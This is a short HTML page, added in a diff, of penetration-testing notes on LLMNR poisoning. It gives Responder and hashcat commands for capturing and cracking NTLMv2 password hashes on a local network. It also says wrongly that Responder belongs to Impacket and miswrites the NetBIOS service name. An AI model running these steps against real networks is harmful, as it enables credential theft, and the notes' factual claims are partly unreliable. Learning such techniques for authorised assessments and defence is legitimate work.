@@ -1,0 +1,31 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>LLMNR Poisoning</title>
+</head><body><b>LLMNR - Link Local Multi-Cast Name Resolution<br/>
+<br/>
+</b>It's basically DNS. It is used to identify Hosts when DNS fails to do so.<br/>
+Previously known as NET-BS -&gt; NetBios Name Service<br/>
+When we respond to this service, it actually responds us back with Username and NTLMv2 hash (password hash)<br/>
+<br/>
+Responder is part of <b>Impacket </b>toolkit.<br/>
+Run responder first thing when you start the assessment to get the traffic.<br/>
+<br/>
+<b>Step 1: Run Responder</b><br/>
+python Responder.py -I tun0 -rdw<br/>
+<br/>
+<b>Step 2: An Event Occurs</b><br/>
+<br/>
+<img src="image.png" width="600" height="194" /><br/>
+<br/>
+<b>Step 3: Get Dem Hashes</b><br/>
+<br/>
+<img src="image 2.png" width="600" height="152" /><br/>
+<br/>
+<b>Step 4: Crack Dem Hashes<br/>
+<br/>
+</b><b>&nbsp; hashcat -m 5600 hashes.txt rockyou.txt&#09;</b><br/>
+<br/>
+<br/>
+</body></html>
